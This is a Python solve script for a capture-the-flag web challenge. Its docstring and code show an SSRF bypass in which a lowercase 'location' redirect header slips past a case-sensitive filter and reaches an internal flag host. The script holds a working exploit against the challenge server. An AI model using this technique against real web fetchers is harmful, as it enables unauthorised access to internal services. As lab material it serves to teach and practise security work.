#!/usr/bin/env python3
"""get-file1 -- THJCC CTF 2026 Summer (web, 100 pts).

An SSRF fetcher (`file.php`) that blocks the internal flag host `flag.thjcc`,
reachable only through a redirect. The bug is a case-sensitivity mismatch
between the app's hand-rolled redirect parser and PHP's own:

    file.php extracts the redirect target with
        str_starts_with($v, 'Location:')      # CASE-SENSITIVE, capital L
    and re-applies the host filter to it. But when it finds *no* such header it
    falls through to a second fetch with follow_location=true, and PHP matches
    the Location header CASE-INSENSITIVELY (strncasecmp).

The redirector service exposes:
    /b -> "Location: http://flag.thjcc/flag.txt"   (capital -> app catches it,
                                                     filter rejects flag.thjcc)
    /a -> "location: http://flag.thjcc/flag.txt"   (lowercase -> app misses it,
                                                     PHP follows it -> flag)

A direct bypass is impossible: the flag service returns the flag only when the
request carries Host: flag.thjcc AND path /flag.txt, and the only way PHP emits
that Host is by actually resolving/redirecting to that literal hostname -- which
the string filter blocks unless PHP itself follows the redirect.

So the whole exploit is one request:

    GET /file.php?u=http://r/a

    python3 solve.py [BASE_URL]
"""
from __future__ import annotations

import re
import sys
import urllib.parse
import urllib.request
import urllib.error

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://chal.thjcc.org:8081"


def fetch(u: str) -> str:
    url = BASE + "/file.php?u=" + urllib.parse.quote(u, safe="")
    try:
        return urllib.request.urlopen(url, timeout=15).read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return f"[HTTP {e.code}] " + e.read().decode("utf-8", "replace")


def main() -> int:
    # the naive path (capital-L Location) is caught by the app's filter:
    print("[*] u=http://r/b  (capital Location, the trap):", fetch("http://r/b").strip())

    # the exploit: lowercase 'location' slips past the case-sensitive parser but
    # is still followed by PHP's follow_location=true fallback fetch.
    body = fetch("http://r/a")
    m = re.search(r"THJCC\{[^}]*\}", body)
    print(f"[*] u=http://r/a  (lowercase location, the bypass): {body.strip()}")
    if m:
        print(f"\n[+] flag: {m.group(0)}")
        return 0
    print("\n[-] no flag recovered")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
